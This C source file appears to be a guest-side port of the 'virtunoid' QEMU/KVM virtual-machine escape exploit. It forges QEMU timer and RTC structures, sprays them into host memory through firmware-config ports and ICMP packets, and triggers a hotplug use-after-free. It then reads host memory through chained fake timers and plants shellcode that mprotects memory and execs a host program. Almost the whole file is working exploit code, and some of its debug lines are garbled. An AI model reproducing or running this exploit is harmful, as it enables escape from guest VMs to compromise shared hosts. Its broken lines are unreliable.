#include <asm/types.h>
#include <stddef.h>
#include "shellcode-config.h"
#include "shellcode.h"

void entry(void){
  PUSH_FLAGS();//make room for return//FIXME
  PUSH_FLAGS();//1ff8 is return
  //FIXME create own stack
  PUSH_X86_64_CLOBBER();
  __asm__ ("lea (%%rip),%%rdi;"//tell shellcode where we are
	   "callq shellcode;":::);
  POP_X86_64_CLOBBER();
  POP_FLAGS();
}

void shellcode( void* rip )
{
  uint64_t *fake_rtc;
  unsigned int data_size;
  unsigned int data_offset;

  uint8_t *buf;//[];

  //begin virtunoid
  //    int fd;
  int i;
  unsigned char *packet;//];
  
  struct target_region *targets;

  

  //struct icmphdr *icmp = (struct icmphdr*)packet;
  //struct sockaddr_in dest = {};
  
  struct QEMUTimer *timer, *timer2;
  hva_t timer_hva;
  hva_t ram_block;
  hva_t highmem_hva_base = 0;
  //  uint32_t oldapic;

  
  __asm__("mov %0,%%rsi;"::"r" (rip):);
  buf = kmalloc(SIZEOF_E820_TABLE+2*PAGE_SIZE+SIZEOF_HPET_CFG);//3 page
  packet = kmalloc(SIZEOF_RTCSTATE - PACKET_OFFSET);//414 bytes
  targets = init_targets(buf);

  
  data_size = SIZEOF_RTCSTATE - PACKET_OFFSET - sizeof(struct icmphdr);
  data_offset=sizeof(struct icmphdr);
  
  /*
    clock = malloc(sizeof *clock);
    clock->type = 0;
    clock->enabled = 1;
  */
  
  if (OFFSET_RTCSTATE_NEXT_SECOND_TIME >=
      OFFSET_RTCSTATE_SECOND_TIMER){
    print("assertion failed: NEXTSECONDTIME\n");
    while(1);
  }
  
  fake_rtc = obj_alloc(OFFSET_RTCSTATE_NEXT_SECOND_TIME,
		       SIZEOF_RTCSTATE);
  
  
  timer = fake_timer(RTC_UPDATE_SECOND, 
		     gva_to_hva(fake_rtc, highmem_hva_base), 
		     0,highmem_hva_base);
  timer2 = fake_timer(RTC_UPDATE_SECOND, 
		      gva_to_hva(fake_rtc, highmem_hva_base), 
		      0,highmem_hva_base);
  timer_hva = gva_to_hva(timer,  highmem_hva_base);
  
#ifdef DEBUG
  print("timer is ") ;
  print_hex(timer) ;
  print("\ntimer_hva is ");
  print_hex(timer_hva);
#endif

  // memset(rtc, 0x77, SIZEOF_RTCSTATE);
  fake_rtc[OFFSET_RTCSTATE_SECOND_TIMER/sizeof(*fake_rtc)] = timer_hva;
  fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;
  
#define RTC(type, offset) (type*)(packet + (offset) - PACKET_OFFSET)
  
  *RTC(hva_t, OFFSET_RTCSTATE_SECOND_TIMER) = timer_hva;
  *RTC(uint64_t, OFFSET_RTCSTATE_NEXT_SECOND_TIME) = 10;
  
  //icmp->checksum = in_cksum((void*)&packet, sizeof packet, 0);//jfp
  
  
  
  snapshot_targets();
    
  commit_targets(fake_rtc);


  //void grab_excep( int n, void *new_fn, unsigned long *old_fn){
  {
    int i;
    unsigned long old;
    const void* new ;
    add_rip(rip);
    new = add_rip(handler());
    
    print("handler is "); print_hex(new);print("\n");
    //    for (i=0x30;i<256;i++)
      {
	i=0xef;//lapic timer
	//	grab_excep(i,new,&old);
	//	grab_excep(0x70,new,&old);//rtc
      }
  }

  {
#define PCI_DEVFN(slot, func)   ((((slot) & 0x1f) << 3) | ((func) & 0x07))
    volatile uint32_t* mem = kmalloc(4);
    //unsigned int domain, unsigned int bus, unsigned int devfn, int reg, int len, uint32_t *val
    raw_pci_read(0,0,PCI_DEVFN(3,0),0,4,(uint64_t)mem);
    print("vendor: ");
    print_hex(*mem);
    print("\n");

    raw_pci_read(0,0,PCI_DEVFN(3,0),0x10,4,mem);
    print("io region 1: ");
    print_hex(*mem);
    print("\n");


    

    while(1);
    
			   
  }				      
  
  print("Triggering hotplug...\n");
  outl(2, PORT);

  i = 0;
  while (timer->expire_time == 0) {
    send_icmp_packet(QEMU_GATEWAY,ICMP_ECHO,0,data_size,(packet + data_offset)
		     ,0);
    if (++i % 1000 == 0){
      refresh_targets() ;
      
    
      print("rt");
    }
  }
  
  print("Timer list hijacked. Reading highmem base...\n");

  ram_block = read_host8(timer, timer2, ADDR_RAMLIST_FIRST,
			 fake_rtc, highmem_hva_base);
  
  

#ifdef DEBUG
  print("ram_block = ");print_hex(ram_block);print("\n");
#endif

  highmem_hva_base = read_host8(timer, timer2, ram_block,
				fake_rtc, highmem_hva_base);
#ifdef DEBUG
  print("highmem hva base = ");print_hex;(highmem_hva_base)print("\n");
#endif 
  print("Exploiting...\n");
  
  timer->next   = construct_payload(highmem_hva_base );

  timer->expire_time = 0;
  
  commit_targets(fake_rtc);
    
#ifdef DEBUG
  print("payload at hva ");print_hex(timer->next);print("\n");
#endif 

  print("Exploited.\n");
  while(1);
}

const void* add_rip(const void* addr){
  static uint64_t rip = 0;
  if (rip == 0){
    rip = (uint64_t)addr;
    rip >>= 12;
    rip <<= 12;
  }
  return rip + addr;
}

void* get_targets(void){
  return set_targets(NULL);
}

void* set_targets(void* ptr){
  static void *result = NULL;
  if(result ==NULL) result = ptr;
  return result;
}

inline void setmem(char* addr,char fill,size_t count){
  int i;
  for ( i = 0; i < count; i++){
    addr[i] = fill;
  }
}

inline void cpymem(char* dest,const char* src,size_t size){
  int i;
  for(i=0;i<size;i++){
    dest[i]=src[i];
  }
}

inline void outw(__u16 v, __u16 port)
{
  asm volatile("outw %0,%1" : : "a" (v), "dN" (port));
}

inline void outl(__u32 v, __u16 port)
{
  asm volatile("outl %0,%1" : : "a" (v), "dN" (port));
}

void* kmalloc(size_t bytes){
  static uintptr_t ptr = 0;
  void* result = NULL;
  const uintptr_t mask = PAGE_SIZE-1;

  if ( ptr == 0){
    __asm__("mov %%rsi, %0":"=r" (ptr)::);
    /*    print("Initial ptr is ")print_hex(ptr)
    print("\nmask is ")print_hex(mask)
    print("\n~mask is ")print_hex(~mask)*/
    ptr = ptr & (~mask);
    //    print("\nPage aligned ptr is ")print_hex(ptr)
    ptr += PAGE_SIZE*3;
    //print("\nMoved page is ")print_hex(ptr)
  }
  if ((bytes >= PAGE_SIZE) && ((ptr & mask) != 0))
    {
      ptr = ptr & (~mask);
    ptr += PAGE_SIZE;
    }
  result = (void*)ptr;
  ptr += bytes;
  //print("Allocated ")print_int(bytes)
  //  print(" bytes. At ")print_hex(result)print("\n")
  return result;
} 

 
inline
unsigned char inb( unsigned short port )
{
  unsigned char ret;
  asm volatile( "inb %1, %0"
		: "=a"(ret) : "Nd"(port) );
  return ret;
}


inline
void outb( unsigned char val , unsigned short port)
{
  asm volatile( "outb %0, %1"
		: : "a"(val), "Nd"(port) );
}




void* get_whereto(void){
  static uint8_t* cmsg = NULL;
  if(cmsg == NULL){
    cmsg = kmalloc(sizeof(struct sockaddr_in));
  }
  return cmsg;
}


void* get_iov(void){
  static uint8_t* cmsg = NULL;
  if(cmsg == NULL){
    cmsg = kmalloc(sizeof(struct iovec));
  }
  return cmsg;
}


void* get_outbuf(void){
  static uint8_t* cmsg = NULL;
  if(cmsg == NULL){
    cmsg = kmalloc(414);
  }
  return cmsg;
}



void* get_msg(void){
  static uint8_t* cmsg = NULL;
  if(cmsg == NULL){
    cmsg = kmalloc(sizeof(struct msghdr));
  }
  return cmsg;
}


void* get_cmsg(void){
  static uint8_t* cmsg = NULL;
  if(cmsg == NULL){
    cmsg = kmalloc(32);
    *cmsg =0x1c;
    *(cmsg+12)=0x08;
  }
  return cmsg;
}

unsigned short in_cksum(unsigned short *addr, int len)
{
  int nleft = len;
  int sum = 0;
  unsigned short *w = addr;
  unsigned short answer = 0;
  if (((uint64_t)w)<0x1000){
    print("byr");
    while(1);
  }
  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }
  
  if (nleft == 1) {
    *(unsigned char *) (&answer) = *(unsigned char *) w;
    sum += answer;
  }
  
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

/*int _printk(const char *fmt, ...){
  __asm__ __volatile__ ("add $0xc8,%%rsp;":::);
  goto *PRINTK;
  }*/

size_t strlen(const char *s)
{
  int d0;
  size_t res;
  asm volatile("repne\n\t"
	       "scasb"
	       : "=c" (res), "=&D" (d0)
	       : "1" (s), "a" (0), "c" (0xffffffffu) //kernel bug July 15 2013
	       : "memory");
  return ~res - 1;
}

char *strcpy(char *dest, const char *src)
{
  int d0, d1, d2;
  asm volatile("1:\tlodsb\n\t"
	       "stosb\n\t"
	       "testb %%al,%%al\n\t"
	       "jne 1b"
	       : "=&S" (d0), "=&D" (d1), "=&a" (d2)
	       : "" (src), "1" (dest) : "memory");
  return dest;
}

int _printk(const char *fmt, ...) {
  __asm__ __volatile__("call add_rip;" //adjust to origin
		       "movq %%rax,%%rdi;" //set up args
		       "movq %%rdi,0x8(%%rsp);"//fmt
		       "call strlen;"
		       "movq 0x8(%%rsp), %%rsi;" //string source
		       "inc %%eax;" //NUL terminated
		       "movq %%rbp, (%%rsp);"//save base
		       "movq %%rsp, %%rbp;"//save stack
		       "sub %%rax,%%rsp;" //allocate space on stack
		       "movq %%rsp,%%rdi;" //destination
		       "call strcpy;"
		       "movq %%rax,%%rdi;"//set up agr
		       "mov  0x18(%%rbp),%%rsi;"
		       "mov  0x20(%%rbp),%%rdx;"
		       "mov  0x28(%%rbp),%%rcx;"
		       "mov  0x30(%%rbp),%%r8;"
		       " mov 0x38(%%rbp),%%r9;"//restore varadic up to 6
		       "xor %%eax,%%eax;"//truncate remaining
		       "pushq %0;"
		       "call *(%%rsp);"
		       "movq %%rbp,%%rsp;"//restore stack
		       "movq (%%rsp),%%rbp;"//restore base
		       ::"g" (PRINTK):X86_64_CLOBBER);
  //do{char __buf[] = "%016lx";_printk(__buf, x );}while(0)  

}



int send_icmp_packet(__u32 destination, __u32 icmp_type,
         __u32 icmp_code,
         unsigned int icmp_data_size,
         char *data,
         __u32 batch_id)			    
{
  int size,ret;
  int len = icmp_data_size + sizeof(struct icmphdr);
  char *outbuf = get_outbuf();
  struct iovec *iov = get_iov();
  // struct socket
  void*sock;
  struct sockaddr_in *whereto = get_whereto();
  struct icmphdr *icmp = (struct icmphdr *) outbuf;
  struct msghdr *msg;
    
  sock_create(AF_INET,SOCK_RAW,IPPROTO_ICMP,&sock);
  //ret = sock_create(AF_INET,SOCK_RAW,IPPROTO_ICMP,&sock);

  msg = get_msg();
  
  msg->msg_name = whereto;
  msg->msg_namelen = sizeof(struct sockaddr_in);
  msg->msg_iov = iov;
  msg->msg_iovlen = 1;
  msg->msg_control = get_cmsg();
  msg->msg_controllen = 0;
  msg->msg_flags = 0;

  //  { &whereto, sizeof(whereto),
  //			&iov, 1, get_cmsg(), 0, 0 };
      
  /* check if socket-creation was successful */
  
      /*    if(ret < 0){
      print("error creating socket\n");
  return -1;
  }*/


  /* fillout sockaddr_in-structure whereto */
  

  setmem((char*)whereto, 0, sizeof(struct sockaddr_in));

  whereto->sin_family = AF_INET;
  whereto->sin_addr.s_addr = destination;

  //  print_hex(outbuf);
  
  /* construct packet */

  if(((uint64_t)outbuf+sizeof(struct icmphdr)) < 0x10000 ||
     ((uint64_t)data) < 0x10000 ||
     icmp_data_size > 0x10000)
    {
      print_hex(outbuf+sizeof(struct icmphdr));print("\n");
      print_hex(data);print("\n");
      print_hex(icmp_data_size);print("\n");
      while(1);//sanity check
    }
  cpymem((outbuf + sizeof(struct icmphdr)), data, icmp_data_size);	

  icmp->type = icmp_type;
  icmp->code = icmp_code;
  
  if((icmp->type == ICMP_ECHO) || (icmp->type == ICMP_TIMESTAMP)){
    /* Note: id is only 16 bit wide. */
    icmp->un.echo.id = batch_id;		
    icmp->un.echo.sequence = 0;
    
  }

  icmp->checksum = 0;

  iov->iov_base = outbuf;
  iov->iov_len = len;//sizeof(outbuf);

  //null ptr check
  if(((uint64_t)outbuf) < 0x1000){
  print("addr/len "); print_hex(outbuf); print_int(len);print("\n");
  while(1);}

  /* calculate icmp-checksum */
  icmp->checksum = in_cksum((ushort *)outbuf, len);



  /* fire! */

  while(len > 0){
    //    print("enter sock_sendmsg");
    size = sock_sendmsg(sock, msg, len);
    // print("leave");
    if (size < 0 ){			
      /* If an error occurs, just don't deliver the
       * packet but keep on going. */
      print("sock_sendmsg error: ");print_int(size);print("\n");
      break;
    }

    len -= size;
    
  }
  //  print("enter sock_release");
  sock_release(sock);
  //  print("leave");
  sock = NULL;

  return 0;
}

//end portbunny

void commit_targets(uint64_t *fake_rtc) {
  struct target_region *t = get_targets();
#ifdef DEBUG
    print("entering commit_targets\n");
#endif

    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;
    for (; t->data; t++) {
        int i;

        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++){
          
	  outb((unsigned char)t->data[i], BIOS_CFG_DATAPORT);
	}
    }
#ifdef DEBUG
    print("leaving commit targets\n");
#endif
}

void refresh_targets(void) {
  struct target_region *t = get_targets();
#ifdef DEBUG
  print("entering refresh_targets\n");
#endif 

  for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            t->data[i] = inb(BIOS_CFG_DATAPORT);
    }
#ifdef DEBUG
  print("leaving refresh_targets\n");
#endif
}

void snapshot_targets(void) {
  struct target_region *t = get_targets();
    for (; t->data; t++)
        t->snapshot = t->alloc;
}

void rollback_targets(void) {
  struct target_region *t = get_targets();
    for (; t->data; t++)
        t->alloc = t->snapshot;
}

void *host_alloc(size_t size) {
  struct target_region *t = get_targets();


    for (; t->data; t++) {
      size_t free;
        if (!t->alloc) {
            t->alloc = t->data;
        }
        free = t->data + t->len - 1 - t->alloc;
        if (free >= size) {
            void *p = t->alloc;
            t->alloc += size;
            return p;
        }
    }

    print("host alloc failed");
    while(1);
    //    assert(0);
    return NULL;
}

void* obj_alloc(size_t start, size_t last) {

    size_t need = last - start;
    void *ptr = host_alloc(need);
    return ptr - start;
}


gpa_t gva_to_gpa(gva_t addr) {
  //unsigned long virt_to_phys(unsigned long x);
  unsigned long paddr = (unsigned long)virt_to_phys((unsigned long)addr);
  //  print("%016lx %016lx\n",addr,paddr);
  return paddr;
  /*  gfn_t gfn = gva_to_gfn(addr);
    //    assert(gfn != (gfn_t)-1);
    return (gfn << PAGE_SHIFT) | page_offset((unsigned long)addr);*/
}



hva_t gpa_to_hva(gpa_t gpa, hva_t highmem_hva_base) {
  if  (gpa <= 0x00100000)
    {
      print("gpa too low\n");
      while(1);//assert
    }
    return gpa  + highmem_hva_base;
}

hva_t gva_to_hva(gva_t addr,  hva_t highmem_hva_base ) {
    struct target_region *r;
    for (r = get_targets(); r->data; r++)
        if (addr > (gva_t)r->data - PAGE_SIZE &&
            addr < (gva_t)r->data + r->len) {
            return r->hva + (addr - (gva_t)r->data);
        }

    return gpa_to_hva(gva_to_gpa(addr),highmem_hva_base);
}

/*00000000004016c5 <shellcode>:
  4016c5:	55                   	push   %rbp
  4016c6:	48 89 e5             	mov    %rsp,%rbp
  4016c9:	48 83 ec 20          	sub    $0x20,%rsp
  4016cd:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  4016d1:	be 02 00 00 00       	mov    $0x2,%esi
  4016d6:	bf 70 00 00 00       	mov    $0x70,%edi
  4016db:	b8 20 69 47 00       	mov    $0x476920,%eax
  4016e0:	ff d0                	callq  *%rax
  4016e2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4016e6:	48 8b 80 00 04 00 00 	mov    0x400(%rax),%rax
  4016ed:	ba 07 00 00 00       	mov    $0x7,%edx
  4016f2:	be 00 20 00 00       	mov    $0x2000,%esi
  4016f7:	48 89 c7             	mov    %rax,%rdi
  4016fa:	b8 58 91 40 00       	mov    $0x409158,%eax
  4016ff:	ff d0                	callq  *%rax
  401701:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401705:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  401709:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  401710:	00 
  401711:	b8 78 7c 40 00       	mov    $0x407c78,%eax
  401716:	ff d0                	callq  *%rax
  401718:	85 c0                	test   %eax,%eax
  40171a:	75 15                	jne    401731 <shellcode+0x6c>
  40171c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401720:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
  401724:	48 89 d6             	mov    %rdx,%rsi
  401727:	48 89 c7             	mov    %rax,%rdi
  40172a:	b8 a8 86 40 00       	mov    $0x4086a8,%eax
  40172f:	ff d0                	callq  *%rax
  401731:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401735:	c7 80 08 04 00 00 01 	movl   $0x1,0x408(%rax)
  40173c:	00 00 00 
  40173f:	c9                   	leaveq 
  401740:	c3                   	retq   
*/

/*
 * Construct and return a single fake timer, with the specified
 * fields.
 */
struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, 
			     struct QEMUTimer *next, hva_t highmem_hva_base) {
    struct QEMUTimer *timer = host_alloc(sizeof *timer);
    setmem((char*)timer, 0, sizeof *timer);
    timer->clock = CLOCK_HVA;
#ifdef HAVE_TIMER_SCALE
    timer->scale = 1;
#endif
    timer->cb = cb;
    timer->opaque = opaque;
    timer->next = next ? gva_to_hva(next,highmem_hva_base) : 0;
    return timer;
}

/*
 * Construct a timer chain that performs an mprotect() and then calls
 * into shellcode.
 */
hva_t construct_payload(hva_t highmem_hva_base) {
    struct IORange *ioport;
    struct IORangeOps *ops;
    struct QEMUTimer *timer;
    //    unsigned  long int mask;// = ~(PAGE_SIZE-1ull);
    //    int i;
    uint8_t* ptr8;
    uint32_t* ptr32;
    int len = 0x69;//0x7c;
    /*    const char* scc = "\x55		\
\x48\x89\xe5\
\x48\x83\xec\x20\
\x48\x89\x7d\xe8\
\xbe\x02\x00\x00\x00\
\xbf\x70\x00\x00\x00\
\xb8\x20\x69\x47\x00\
\xff\xd0\
\x48\x8b\x45\xe8\
\x48\x8b\x80\x00\x04\x00\x00\
\xba\x07\x00\x00\x00\
\xbe\x00\x20\x00\x00\
\x48\x89\xc7\
\xb8\x58\x91\x40\x00\
\xff\xd0\
\x48\x8b\x45\xe8\
\x48\x89\x45\xf0\
\x48\xc7\x45\xf8\x00\x00\x00\
\x00\
\x48\x8b\x45\xe8\
\xc7\x80\x08\x04\x00\x00\x01\
\x00\x00\x00\
\xc9\
\xc3";

    / *
\xb8\x78\x7c\x40\x00\
\xff\xd0\
\x85\xc0\
\x75\x15\
\x48\x8b\x45\xe8\
\x48\x8d\x55\xf0\
\x48\x89\xd6\
\x48\x89\xc7\
\xb8\xa8\x86\x40\x00\
\xff\xd0\
    */


    //#define EXIT 0x408a98
    /*
\xb8\x98\x8a\x40\x00\
\xff\xd0\
    */

    //67, 4d, 6b, 6f
    const char* sc = "\x55\
\x48\x8d\x2d\xf8\xff\xff\xff\
\x31\xf6\x83\xc6\x02\
\x31\xff\x83\xc7\x70\
\x8b\x45\x67\
\xff\xd0\
\x48\x83\xec\x20\
\x48\x8d\x45\x4d\
\x48\x89\x44\x24\x10\
\x31\xc0\x48\x89\x44\x24\x18\
\x8b\x45\x6b\
\xff\xd0\
\x85\xc0\
\x75\x15\
\x48\x8d\x54\x24\x10\
\x48\x8b\x02\
\x48\x89\xd6\
\x48\x89\xc7\
\x8b\x45\x6f\
\xff\xd0\
\x48\x83\xc4\x20\
\x5d\
\xc3/usr/bin/gnome-calculator";

	 len = 103;//strlen(sc)+1

    ops = (struct IORangeOps *)kmalloc(sizeof ops);//,);
    if (ops ==NULL){
	print("kmalloc failed\n");
	while(1);
    }

    ops->read = MPROTECT;
    ops->write = 0;


    ioport = (struct IORange*) kmalloc(2*PAGE_SIZE);//,);

#ifdef DEBUG
    print("ioport is ");print_hex(ioport);print("\n");//should be
#endif

    //page aligned


    /*    mask = (long unsigned int)ioport;

    mask = mask >> 12;
    mask = mask << 12;/ *
        for(i=0; i< 12;i++)
      mask = mask /2 ;
    for(i=0; i < 12; i++)
      mask = mask *2;
		      

    mask += PAGE_SIZE;

    ioport = (struct IORange*)mask;*/
    /*	(
				 ((unsigned long int)ioport )
				 | ~(PAGE_SIZE-1)
				 )+PAGE_SIZE);*/
    //print("ioport is ")print_hex(ioport)print("\n");



    ioport->ops = gva_to_hva(ops,highmem_hva_base);
    ioport->base = -(2*PAGE_SIZE);



    //share.shellcode = gva_to_hva(ioport);



    sc = add_rip(sc);

    // print hex 
#ifdef DEBUG
    print("io+1 is ");
    print_hex(ioporte;+1);print("\n")			  ;  
    print("sc is ");print_hex(sc);print("\n");
#endif

    cpymem((char*)(ioport + 1), sc, len);
    ptr8 = (uint8_t*)(ioport+1);
    ptr8 += len;
    ptr32 = (uint32_t*)ptr8;
    *ptr32++ = ISA_UNASSIGN_IOPORT;
    *ptr32++=FORK;
    *ptr32=EXECV;


    timer = fake_timer(gva_to_hva(ioport+1,highmem_hva_base), 
		       0,
		       NULL,highmem_hva_base);
		       //gva_to_hva((void*)&share), timer);//joke

    //    timer = fake_timer(0xdeadbeef,0xcafebabe,timer);

    //timer = fake_timer(0, 0 ,timer);//print 40ascii '@'
    //timer = fake_timer(CPU_OUTL, 0x5e155e, timer);//
    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport,highmem_hva_base),
		       timer,highmem_hva_base);
    timer = fake_timer(CPU_OUTL, 0, timer,highmem_hva_base);//0x5e155e

#ifdef DEBUG
    print("leaving construct_payload\n");
#endif

    return gva_to_hva(timer, highmem_hva_base);
}


/*
 * Construct a timer chain that reads a single 4-byte value from the
 * host, and writes a pointer to the result into *out.
 */
struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **out, hva_t highmem_hva_base) {
    uint32_t *ptr = host_alloc(sizeof *ptr);
    *out = ptr;

    timer = fake_timer(BDRV_RW_EM_CB, gva_to_hva(ptr,highmem_hva_base), 
		       timer, highmem_hva_base);
    timer = fake_timer(KVM_ARCH_DO_IOPERM, hva - 8, timer,highmem_hva_base);
    timer = fake_timer(QEMU_GET_RAM_PTR, 1<<20, timer,highmem_hva_base);

    return timer;
}


/*
 * Read and return 8 bytes from the host.
 *
 * The timer 'head' is currently queued on the host's timer queues,
 * and after return, 'chain' will be queued.
 */
uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *timer, 
		    hva_t addr, uint64_t *fake_rtc, hva_t highmem_hva_base) {
    uint64_t val = 0;
    int i = 0;
    uint32_t *low, *hi;

    //    struct QEMUTimer *timer = chain;
    timer->next = 0;
    timer = construct_read(timer, addr, &low,highmem_hva_base);
    timer = construct_read(timer, addr + 4, &hi,highmem_hva_base);
    head->next = gva_to_hva(timer,highmem_hva_base);
    head->expire_time = 0;
    *hi = (uint32_t)-1;
    commit_targets(fake_rtc);
    while (*hi == (uint32_t)-1) {

      for (i = 0; i < 1000000;i++)outb(0,0x80);//udelay(1)
      //sleep(1);
      refresh_targets();
    }
    val = ((uint64_t)*hi << 32) | (uint64_t)*low;
    rollback_targets();
    return val;
}

struct desc_struct* get_idt(void){
  struct desc_struct* idt = NULL;
  uint8_t* idtr = kmalloc(10);
  __asm__ __volatile__("sidt %0": "=m" (*idtr));
  idt = *( (struct desc_struct**) (idtr+2));
  return idt;
}

void grab_excep( int n, const void *new_fn, uint64_t *old_fn){
  unsigned long new_addr = (unsigned long)new_fn;

  struct desc_struct* idt = get_idt();

  /* save address of old handler */
  if ( old_fn )     {
    *old_fn = (idt[n].off_higher);
    *old_fn <<= 32;
    *old_fn += (idt[n].off_hi << 16) + idt[n].off_lo;
  }    

  /* insert new exception handler */
  idt[n].off_higher = 0xffff8800;
  idt[n].off_hi = (unsigned short)(new_addr >> 16);
  idt[n].off_lo = (unsigned short)(new_addr & 0x0000FFFF);
  return;
}




struct target_region *init_targets(uint8_t *buf){
  struct target_region *targets = kmalloc(sizeof(struct target_region)*3);

  /*struct target_region {
    hva_t hva;
    uint8_t *data;
    size_t len;
    uint16_t entry;
    uint8_t *alloc;
    uint8_t *snapshot;
    };
  */

  targets->hva = E820_TABLE;
  targets->data = buf;
  targets->len = SIZEOF_E820_TABLE;
  targets->entry = FW_CFG_E820_TABLE;
  
  (targets+1)->hva = HPET_CFG;
  (targets+1)->data = buf + SIZEOF_E820_TABLE + PAGE_SIZE;
  (targets+1)->len = SIZEOF_HPET_CFG;
  (targets+1)->entry = FW_CFG_HPET;
  
  set_targets(targets);
}

// Call this function when populating the IDT, to get the address of the ISR handling code
void * handler( void )
{
  void * ret = &&startOfISR; //prevent warning of leaking local label
  __asm__ __volatile__ goto( "jmp %l[endOfISR]" 
			     : : : "memory" : endOfISR );
  __asm__ __volatile__( ".align 16\t\n" : : : "memory" );  
  // align by 16 for efficiency - could be even higher, depending on CPU
 startOfISR:
  PUSH_X86_64_CLOBBER();
  print("caught interrupt\n");
  POP_X86_64_CLOBBER();
 
  __asm__ __volatile__( "iretq\t\n" : : : "memory" );
 endOfISR:
  return ret;
  //  __asm__ __volatile__ goto( "movl %l[startOfISR], %%eax" 
  //			     : : : "memory" : startOfISR );
  //doesnt work, trys to deref
}
